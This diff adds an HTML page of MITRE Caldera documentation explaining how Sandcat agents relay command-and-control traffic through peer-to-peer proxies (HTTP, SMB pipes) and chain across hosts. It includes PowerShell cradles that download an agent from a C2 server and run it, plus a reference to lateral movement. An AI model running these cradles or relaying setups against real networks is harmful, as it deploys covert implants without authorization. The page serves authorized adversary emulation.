@@ -1,0 +1,460 @@
+
+
+<!DOCTYPE html>
+<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <title>Peer-to-Peer Proxy Functionality for Sandcat Agents &mdash; caldera  documentation</title>
+  
+
+  
+  
+  
+  
+
+  
+  <script type="text/javascript" src="_static/js/modernizr.min.js"></script>
+  
+    
+      <script type="text/javascript" id="documentation_options" data-url_root="./" src="_static/documentation_options.js"></script>
+        <script data-url_root="./" id="documentation_options" src="_static/documentation_options.js"></script>
+        <script src="_static/jquery.js"></script>
+        <script src="_static/underscore.js"></script>
+        <script src="_static/_sphinx_javascript_frameworks_compat.js"></script>
+        <script src="_static/doctools.js"></script>
+    
+    <script type="text/javascript" src="_static/js/theme.js"></script>
+
+    
+
+  
+  <link rel="stylesheet" href="_static/css/theme.css" type="text/css" />
+  <link rel="stylesheet" href="_static/pygments.css" type="text/css" />
+  <link rel="stylesheet" href="_static/pygments.css" type="text/css" />
+  <link rel="stylesheet" href="_static/css/theme.css" type="text/css" />
+    <link rel="index" title="Index" href="genindex.html" />
+    <link rel="search" title="Search" href="search.html" />
+    <link rel="next" title="C2 Communications Tunneling" href="C2-Tunneling.html" />
+    <link rel="prev" title="Exfiltration" href="Exfiltration.html" /> 
+</head>
+
+<body class="wy-body-for-nav">
+
+   
+  <div class="wy-grid-for-nav">
+    
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+          
+
+          
+            <a href="index.html">
+          
+
+          
+            
+            <img src="_static/caldera-logo.png" class="logo" alt="Logo"/>
+          
+          </a>
+
+          
+            
+            
+          
+
+          
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+
+          
+        </div>
+
+        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
+          
+            
+            
+              
+            
+            
+              <p class="caption" role="heading"><span class="caption-text">Usage Guides</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="Installing-CALDERA.html">Installing CALDERA</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Getting-started.html">Getting started</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Learning-the-terminology.html">Learning the terminology</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Basic-Usage.html">Basic Usage</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Server-Configuration.html">Server Configuration</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Plugin-library.html">Plugin library</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Parsers.html">Parsers</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Relationships.html">Relationships</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Requirements.html">Requirements</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Objectives.html">Objectives</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Operation-Results.html">Operation Results</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Initial-Access-Attacks.html">Initial Access Attacks</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Lateral-Movement-Guide.html">Windows Lateral Movement Guide</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Dynamically-Compiled-Payloads.html">Dynamically-Compiled Payloads</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Exfiltration.html">Exfiltration</a></li>
+<li class="toctree-l1 current"><a class="current reference internal" href="#">Peer-to-Peer Proxy Functionality for Sandcat Agents</a><ul>
+<li class="toctree-l2"><a class="reference internal" href="#how-sandcat-uses-peer-to-peer">How Sandcat Uses Peer-to-Peer</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#determining-available-receivers">Determining Available Receivers</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#required-gocat-extensions">Required gocat Extensions</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#command-line-options">Command Line Options</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#quickstart">Quickstart</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#starting-receivers">Starting Receivers</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#manually-connecting-to-peers-via-command-line">Manually Connecting to Peers via Command-Line</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#chaining-peer-to-peer">Chaining Peer-to-Peer</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="#peer-to-peer-interfaces">Peer-To-Peer Interfaces</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#current-peer-to-peer-implementations">Current Peer-to-Peer Implementations</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#http-proxy">HTTP proxy</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#example-commands">Example commands:</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="C2-Tunneling.html">C2 Communications Tunneling</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Uninstalling-CALDERA.html">Uninstall CALDERA</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Troubleshooting.html">Troubleshooting</a></li>
+<li class="toctree-l1"><a class="reference internal" href="resources.html">Resources</a></li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">Plugin Documentation</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="plugins/sandcat/Sandcat-Details.html">Sandcat Plugin Details</a></li>
+<li class="toctree-l1"><a class="reference internal" href="plugins/stockpile/Exfiltration-How-Tos.html">Exfiltration Scenarios and Setup</a></li>
+<li class="toctree-l1"><a class="reference internal" href="plugins/stockpile/Exfiltration-How-Tos.html#an-example">An Example</a></li>
+<li class="toctree-l1"><a class="reference internal" href="plugins/stockpile/Exfiltration-How-Tos.html#wrap-up">Wrap-up</a></li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">Developer Information</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="The-REST-API.html">The REST API</a></li>
+<li class="toctree-l1"><a class="reference internal" href="How-to-Build-Plugins.html">How to Build Plugins</a></li>
+<li class="toctree-l1"><a class="reference internal" href="How-to-Build-Planners.html">How to Build Planners</a></li>
+<li class="toctree-l1"><a class="reference internal" href="How-to-Build-Agents.html">How to Build Agents</a></li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">Core System API</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="_generated/modules.html">app</a></li>
+</ul>
+
+            
+          
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+
+      
+      <nav class="wy-nav-top" aria-label="top navigation">
+        
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="index.html">caldera</a>
+        
+      </nav>
+
+
+      <div class="wy-nav-content">
+        
+        <div class="rst-content">
+        
+          
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div role="navigation" aria-label="breadcrumbs navigation">
+
+  <ul class="wy-breadcrumbs">
+    
+      <li><a href="index.html">Docs</a> &raquo;</li>
+        
+      <li>Peer-to-Peer Proxy Functionality for Sandcat Agents</li>
+    
+    
+      <li class="wy-breadcrumbs-aside">
+        
+            
+            <a href="_sources/Sandcat-Peer-to-Peer.md.txt" rel="nofollow"> View page source</a>
+          
+        
+      </li>
+    
+  </ul>
+
+  
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+            
+  <div class="section" id="peer-to-peer-proxy-functionality-for-sandcat-agents">
+<h1>Peer-to-Peer Proxy Functionality for Sandcat Agents<a class="headerlink" href="#peer-to-peer-proxy-functionality-for-sandcat-agents" title="Permalink to this heading">¶</a></h1>
+<p>In certain scenarios, an agent may start on a machine that can’t directly connect to the C2 server.
+For instance, agent A may laterally move to a machine that is on an internal network and cannot beacon out to the C2.
+By giving agents peer-to-peer capabilities, users can overcome these limitations. Peer-to-peer proxy-enabled agents
+can relay messages and act as proxies between the C2 server and peers, giving users more flexibility in their
+Caldera operations.</p>
+<p>This guide will explain how Sandcat incorporates peer-to-peer proxy functionality and how users can include it
+in their operations.</p>
+<div class="section" id="how-sandcat-uses-peer-to-peer">
+<h2>How Sandcat Uses Peer-to-Peer<a class="headerlink" href="#how-sandcat-uses-peer-to-peer" title="Permalink to this heading">¶</a></h2>
+<p>By default, a Sandcat agent will try to connect to its defined C2 server using the provided C2 protocol
+(e.g. HTTP). Under ideal circumstances, the requested C2 server is valid and reachable by the agent, and no issues
+occur. Because agents cannot guarantee that the requested C2 server is valid, that the requested C2 protocol is
+valid and supported by the agent, nor that the C2 server is even reachable, the agent will fall back to
+peer-to-peer proxy methods as a backup method. The order of events is as follows:</p>
+<ol class="arabic simple">
+<li><p>Agent checks if the provided C2 protocol is valid and supported. If not, the agent resorts to peer-to-peer proxy.</p></li>
+<li><p>If the C2 protocol is valid and supported, the agent will try to reach out to the provided C2 server using
+that protocol. If the agent gets a successful Beacon, then it continues using the established C2 protocol and server.
+If the agent misses 3 Beacons in a row (even after having successfully Beaconed in the past),
+then the agent will fall back to peer-to-peer proxy.</p></li>
+</ol>
+<p>When falling back to peer-to-peer proxy methods, the agent does the following:</p>
+<ol class="arabic simple">
+<li><p>Search through all known peer proxy receivers and see if any of their protocols are supported.</p></li>
+<li><p>If the agent finds a peer proxy protocol it can use, it will switch its C2 server and C2 protocol to one of
+the available corresponding peer proxy locations and the associated peer proxy protocol.
+For example, if an agent cannot successfully make HTTP requests to
+the C2 server at <code class="docutils literal notranslate"><span class="pre">http://10.1.1.1:8080</span></code>, but it knows that another agent is proxying peer communications through
+an SMB pipe path available at <code class="docutils literal notranslate"><span class="pre">\\WORKSTATION\pipe\proxypipe</span></code>, then the agent will check if it supports SMB Pipe
+peer-to-peer proxy capabilities. If so (i.e. if the associated gocat extension was included in the Sandcat binary),
+then the agent will change its server to <code class="docutils literal notranslate"><span class="pre">\\WORKSTATION\pipe\proxypipe</span></code> and its C2 protocol to <code class="docutils literal notranslate"><span class="pre">SmbPipe</span></code>.</p></li>
+</ol>
+<p>The agent also keeps track of which peer proxy receivers it has tried so far, and it will round-robin through each
+one it hasn’t tried until it finds one it can use. If the agent cannot use any of the available peer proxy receivers,
+or if they happen to all be offline or unreachable, then the agent will pause and try each one again.</p>
+<div class="section" id="determining-available-receivers">
+<h3>Determining Available Receivers<a class="headerlink" href="#determining-available-receivers" title="Permalink to this heading">¶</a></h3>
+<p>Since an agent that requires peer-to-peer communication can’t reach the C2 server, it needs a way to obtain the
+available proxy peer receivers (their protocols and where to find them). Currently, Caldera achieves this by
+including available peer receiver information in the dynamically-compiled binaries. When agents hosting peer proxy
+receivers check in through a successful beacon to the C2, the agents will include their peer-to-peer proxy receiver
+addresses and corresponding protocols, if any. The C2 server will store this information to later include
+in a dynamically compiled binary upon user request.</p>
+<p>Users can compile a Sandcat binary that includes known available peer-to-peer receivers
+(their protocols and locations), by using the <code class="docutils literal notranslate"><span class="pre">includeProxyPeers</span></code> header when sending the HTTP requests
+to the Caldera server for agent binary compilation. In order for a receiver to be included, the agent hosting
+the receiver must be trusted, and the peer-to-peer protocol for the receiver must be included in the header
+value.</p>
+<p>The header value can take one of the following formats:</p>
+<ul class="simple">
+<li><p><code class="docutils literal notranslate"><span class="pre">All</span></code> : include all available receivers</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">protocol1,protocol2,protocol3</span></code> : include only the proxy receivers that follow the requested protocols
+(comma-separated).</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">!protcol1,protocol2,protocol3</span></code> : include all available receivers, EXCEPT those that use the indicated protocols.</p></li>
+</ul>
+<p>By specifying protocols, users have greater control over their agents’ communication, especially when they
+do not want particular protocols to appear in the local network traffic.</p>
+<p>For example, suppose trusted agents A, B, C are each running HTTP proxy receivers at network addresses
+<code class="docutils literal notranslate"><span class="pre">http://10.1.1.11:8081</span></code>, <code class="docutils literal notranslate"><span class="pre">http://10.1.1.12:8082</span></code>, <code class="docutils literal notranslate"><span class="pre">http://10.1.1.13:8083</span></code>, respectively. The peer-to-peer proxy protocol
+is <code class="docutils literal notranslate"><span class="pre">HTTP</span></code>. When compiling a binary with the HTTP header <code class="docutils literal notranslate"><span class="pre">includeProxyPeers:All</span></code> or <code class="docutils literal notranslate"><span class="pre">includeProxyPeers:HTTP</span></code>, the
+binary will contain all 3 URLs for the agent to use in case it cannot connect to the specified C2.</p>
+</div>
+<div class="section" id="required-gocat-extensions">
+<h3>Required gocat Extensions<a class="headerlink" href="#required-gocat-extensions" title="Permalink to this heading">¶</a></h3>
+<p>To leverage peer-to-peer functionality, one or more gocat extensions may need to be installed. This can be done
+through cradles by including the <code class="docutils literal notranslate"><span class="pre">gocat-extensions</span></code> header when sending HTTP requests to the Caldera server for
+dynamic Sandcat compilation. The header value will be a comma-separated list of all the desired extensions
+(e.g. <code class="docutils literal notranslate"><span class="pre">proxy_method1,proxy_method2</span></code>). If the requested extension is supported and available within the user’s current
+Caldera installation, then the extension will be included.</p>
+</div>
+<div class="section" id="command-line-options">
+<h3>Command Line Options<a class="headerlink" href="#command-line-options" title="Permalink to this heading">¶</a></h3>
+<div class="section" id="quickstart">
+<h4>Quickstart<a class="headerlink" href="#quickstart" title="Permalink to this heading">¶</a></h4>
+<p>To enable an agent to be used as a proxy:</p>
+<ol class="arabic simple">
+<li><p>Include this header in the download command <code class="docutils literal notranslate"><span class="pre">-H</span> <span class="pre">&quot;gocat-extensions:proxy_http&quot;</span></code></p></li>
+<li><p>Run that agent with the <code class="docutils literal notranslate"><span class="pre">-listenP2P</span></code> flag</p></li>
+</ol>
+<p>To enable an agent to use the other proxy agents you’ve established:</p>
+<ol class="arabic simple">
+<li><p>Include this header in the download command <code class="docutils literal notranslate"><span class="pre">-H</span> <span class="pre">&quot;gocat-extensions:proxy_http&quot;</span></code></p></li>
+</ol>
+<p>Optional: This header can speed up the proxy finding process: <code class="docutils literal notranslate"><span class="pre">-H</span> <span class="pre">&quot;includeProxyPeers:HTTP&quot;</span></code>. It tells the server to include a list of known proxy peers in the executable.</p>
+</div>
+<div class="section" id="starting-receivers">
+<h4>Starting Receivers<a class="headerlink" href="#starting-receivers" title="Permalink to this heading">¶</a></h4>
+<p>To start an agent with peer-to-peer proxy receivers, the <code class="docutils literal notranslate"><span class="pre">-listenP2P</span></code> commandline switch must be used (no
+parameters taken). When this switch is set, the agent will activate all supported peer-to-peer proxy receivers.</p>
+<p>Example powershell commands to start an agent with HTTP and SMB Pipe receivers:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$url=&quot;http://192.168.137.122:8888/file/download&quot;;
+$wc=New-Object System.Net.WebClient;
+$wc.Headers.add(&quot;platform&quot;,&quot;windows&quot;);
+$wc.Headers.add(&quot;file&quot;,&quot;sandcat.go&quot;);
+$wc.Headers.add(&quot;gocat-extensions&quot;,&quot;proxy_http,proxy_smb_pipe&quot;); # Include gocat extensions for the proxy protocols.
+$output=&quot;C:\Users\Public\sandcat.exe&quot;;
+$wc.DownloadFile($url,$output);
+C:\Users\Public\sandcat.exe -server http://192.168.137.122:8888 -v -listenP2P;
+</pre></div>
+</div>
+</div>
+<div class="section" id="manually-connecting-to-peers-via-command-line">
+<h4>Manually Connecting to Peers via Command-Line<a class="headerlink" href="#manually-connecting-to-peers-via-command-line" title="Permalink to this heading">¶</a></h4>
+<p>In cases where operators know ahead of time that a newly spawned agent cannot directly connect to the C2,
+they can use the existing command-line options for Sandcat to have the new agent connect to a peer.
+To do so, the <code class="docutils literal notranslate"><span class="pre">-c2</span></code> and <code class="docutils literal notranslate"><span class="pre">-server</span></code> options  are set to the peer-to-peer proxy protocol and address of the
+peer’s proxy receiver, respectively.</p>
+<p>For example, suppose trusted agent A is running an SMB pipe proxy receiver at pipe path
+<code class="docutils literal notranslate"><span class="pre">\\WORKSTATION1\pipe\agentpipe</span></code>. Instead of compiling a new agent using the HTTP header <code class="docutils literal notranslate"><span class="pre">includeProxyPeers:All</span></code> or
+<code class="docutils literal notranslate"><span class="pre">includeProxyPeers:SmbPipe</span></code> to include the pipe path information in the binary, operators can simply specify
+<code class="docutils literal notranslate"><span class="pre">-c2</span> <span class="pre">SmbPipe</span></code> and <code class="docutils literal notranslate"><span class="pre">-server</span> <span class="pre">\\WORKSTATION1\pipe\agentpipe</span></code> in the command to run the agent. Note that in this instance,
+the appropriate SMB pipe proxy gocat extension will need to be installed when compiling the agent binaries.</p>
+<p>Example powershell commands to start an agent and have it directly connect to a peer’s SMB pipe proxy receiver:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$url=&quot;http://192.168.137.122:8888/file/download&quot;;
+$wc=New-Object System.Net.WebClient;
+$wc.Headers.add(&quot;platform&quot;,&quot;windows&quot;);
+$wc.Headers.add(&quot;file&quot;,&quot;sandcat.go&quot;);
+$wc.Headers.add(&quot;gocat-extensions&quot;,&quot;proxy_smb_pipe&quot;); # Required extension for SMB Pipe proxy.
+$output=&quot;C:\Users\Public\sandcat.exe&quot;;
+$wc.DownloadFile($url,$output);
+
+# ...
+# ... transfer SMB Pipe-enabled binary to new machine via lateral movement technique
+# ...
+
+# Run new agent
+C:\Users\Public\sandcat.exe -server \\WORKSTATION1\pipe\agentpipe -c2 SmbPipe;
+</pre></div>
+</div>
+</div>
+</div>
+<div class="section" id="chaining-peer-to-peer">
+<h3>Chaining Peer-to-Peer<a class="headerlink" href="#chaining-peer-to-peer" title="Permalink to this heading">¶</a></h3>
+<p>In complex circumstances, operators can create proxy chains of agents, where communication with the C2 traverses
+several hops through agent peer-to-peer links. The peer-to-peer proxy links do not need to all use the same
+proxy protocol. If an agent is running a peer-to-peer proxy receiver via the <code class="docutils literal notranslate"><span class="pre">-listenP2P</span></code> command-line flag,
+and if the agent uses peer-to-peer communications to reach the C2 (either automatically or manually), then
+the chaining will occur automatically without additional user interaction.</p>
+<p>Manual example - run peer proxy receivers, but manually connect to another agent’s pipe to communicate with the
+C2:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Public</span>\<span class="n">sandcat</span><span class="o">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">server</span> \\<span class="n">WORKSTATION1</span>\<span class="n">pipe</span>\<span class="n">agentpipe</span> <span class="o">-</span><span class="n">listenP2P</span>
+</pre></div>
+</div>
+</div>
+</div>
+<div class="section" id="peer-to-peer-interfaces">
+<h2>Peer-To-Peer Interfaces<a class="headerlink" href="#peer-to-peer-interfaces" title="Permalink to this heading">¶</a></h2>
+<p>At the core of the Sandcat peer-to-peer functionality are the peer-to-peer clients and peer-to-peer receivers.
+Agents can operate one or both, and can support multiple variants of each.  For instance, an agent that cannot
+directly reach the C2 server would run a peer-to-peer client that will reach out to a peer-to-peer receiver running
+on a peer agent. Depending on the gocat extensions that each agent supports, an agent could run many different types
+of peer-to-peer receivers simultaneously in order to maximize the likelihood of successful proxied peer-to-peer
+communication.</p>
+<p>Direct communication between the Sandcat agent and the C2 server is defined by the Contact interface in the contact.go
+file within the <code class="docutils literal notranslate"><span class="pre">contact</span></code> gocat package. Because all peer-to-peer communication eventually gets proxied to the C2
+server, agents essentially treat their peer proxy receivers as just another server.</p>
+<p>The peer-to-peer proxy receiver functionality is defined in the <code class="docutils literal notranslate"><span class="pre">P2pReceiver</span></code> interface in the proxy.go file
+within the <code class="docutils literal notranslate"><span class="pre">proxy</span></code> gocat package. Each implementation requires the following:</p>
+<ul class="simple">
+<li><p>Method to initialize the receiver</p></li>
+<li><p>Method to run the receiver itself as a go routine (provide the forwarding proxy functionality)</p></li>
+<li><p>Methods to update the upstream server and communication implementation</p></li>
+<li><p>Method to cleanly terminate the receiver.</p></li>
+<li><p>Method to get the local receiver addresses.</p></li>
+</ul>
+</div>
+<div class="section" id="current-peer-to-peer-implementations">
+<h2>Current Peer-to-Peer Implementations<a class="headerlink" href="#current-peer-to-peer-implementations" title="Permalink to this heading">¶</a></h2>
+<div class="section" id="http-proxy">
+<h3>HTTP proxy<a class="headerlink" href="#http-proxy" title="Permalink to this heading">¶</a></h3>
+<p>The Sandcat agent currently supports one peer-to-peer proxy: a basic HTTP proxy. Agents that want to use the HTTP
+peer-to-peer proxy can connect to the C2 server via an HTTP proxy running on another agent. Agent A can start an
+HTTP proxy receiver (essentially a proxy listener) and forward any requests/responses. Because the nature of an
+HTTP proxy receiver implies that the running agent will send HTTP requests upstream, an agent must be using the HTTP
+c2 protocol in order to successfully provide HTTP proxy receiver services.</p>
+<p>The peer-to-peer HTTP client is the same HTTP implementation of the Contact interface, meaning that an agent simply
+needs to use the <code class="docutils literal notranslate"><span class="pre">HTTP</span></code> c2 protocol in order to connect to an HTTP proxy receiver.</p>
+<p>In order to run an HTTP proxy receiver, the Sandcat agent must have the <code class="docutils literal notranslate"><span class="pre">proxy_http</span></code> gocat extension installed.</p>
+<div class="section" id="example-commands">
+<h4>Example commands:<a class="headerlink" href="#example-commands" title="Permalink to this heading">¶</a></h4>
+<p>Compiling and running a Sandcat agent that supports HTTP receivers:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$url=&quot;http://192.168.137.122:8888/file/download&quot;;
+$wc=New-Object System.Net.WebClient;$wc.Headers.add(&quot;platform&quot;,&quot;windows&quot;); 
+$wc.Headers.add(&quot;file&quot;,&quot;sandcat.go&quot;);
+$wc.Headers.add(&quot;gocat-extensions&quot;,&quot;proxy_http&quot;);
+$output=&quot;C:\Users\Public\sandcat.exe&quot;;$wc.DownloadFile($url,$output);
+C:\Users\Public\sandcat.exe -server http://192.168.137.122:8888 -v -listenP2P
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+
+           </div>
+           
+          </div>
+          <footer>
+  
+    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
+      
+        <a href="C2-Tunneling.html" class="btn btn-neutral float-right" title="C2 Communications Tunneling" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
+      
+      
+        <a href="Exfiltration.html" class="btn btn-neutral float-left" title="Exfiltration" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
+      
+    </div>
+  
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>
+        &copy; Copyright 2023, The MITRE Corporation
+
+    </p>
+  </div>
+  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/rtfd/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 
+
+</footer>
+
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+  
+
+
+  <script type="text/javascript">
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script>
+
+  
+  
+    
+   
+
+</body>
+</html>
